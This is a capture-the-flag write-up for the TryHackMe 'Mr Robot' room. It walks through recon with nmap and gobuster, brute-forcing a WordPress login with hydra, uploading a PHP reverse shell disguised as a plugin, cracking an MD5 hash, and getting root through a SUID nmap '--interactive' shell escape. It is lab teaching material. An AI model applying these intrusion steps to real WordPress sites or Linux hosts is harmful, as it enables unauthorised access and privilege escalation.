# [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

First order of business, `nmap`

```
# Nmap 7.92 scan initiated Fri Sep 10 16:01:36 2021 as: nmap -vvv -p 80,443 -sCV -oA init 10.10.253.241
Nmap scan report for 10.10.253.241
Host is up, received syn-ack (0.42s latency).
Scanned at 2021-09-10 16:01:50 +07 for 65s

PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack Apache httpd
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 10 16:02:55 2021 -- 1 IP address (1 host up) scanned in 79.09 seconds
```

Looking at the web page (port 80 and 443 host the same site), it just seems like a fun interactive page without anything useful for now. Looking at `robots.txt`, we have 2 files to check out.

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

The file `key-1-of-3.txt` is our 1st flag, and `fsocity.dic` is a word list we'll probably need later. With nothing else to go off of, we run `gobuster`.

```
/images               (Status: 403) [Size: 216]
/blog                 (Status: 403) [Size: 214]
/sitemap              (Status: 200) [Size: 0]
/video                (Status: 403) [Size: 215]
/wp-content           (Status: 200) [Size: 0]
/admin                (Status: 200) [Size: 1077]
/audio                (Status: 403) [Size: 215]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2671]
/css                  (Status: 403) [Size: 213]
/rss2                 (Status: 200) [Size: 809]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 403) [Size: 221]
/js                   (Status: 403) [Size: 212]
/rdf                  (Status: 200) [Size: 809]
/page1                (Status: 200) [Size: 1077]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/%20                  (Status: 200) [Size: 1077]
/wp-admin             (Status: 200) [Size: 2642]
/phpmyadmin           (Status: 403) [Size: 94]
/0000                 (Status: 200) [Size: 8210]
/xmlrpc               (Status: 405) [Size: 42]
```

Looks like we have wordpress. We can try logging in at `/wp-login`. Trying an invalid username gives us the error "Invalid username." so we can use this, along with a list of characters from the show "Mr. Robot", to fuzz for a username with `hydra`. With that, we should have a username. After getting the username, we can fuzz for the password using `hydra` and the wordlist `fsocity.dic` we previously found and get the password. With username and password, we can login.

Logged in, we find that we're able to upload plugins. To upload a reverse shell, grab a PHP reverse shell of your choice and add the following lines to it right after the opening `<?php`.

```php
/*
Plugin Name:  rev
*/
```

After that, `zip` it up and upload it at `/wp-admin/plugin-install.php?tab=upload`. Reverse shell uploaded, we set up a listener and activate the plugin to get a shell as "daemon".

Looking in `/home`, we have the user "robot" whose home we can view. There's our 2nd flag `key-2-of-3.txt` which we can't read yet and an MD5 password hash in `password.raw-md5` which we can crack. With the password cracked, we can `su robot`, become the user "robot" and grab the 2nd flag.

We then `find` SUID executables.

```sh
robot@linux:~$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

We find that `nmap` has SUID set. Old `nmap` has `--intereactive` which can give us a shell so we run `nmap` with that, followed by `!bash -p` with `-p` to make use of the SUID bit and get a root shell.

```sh
robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash -p
bash-4.3# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```
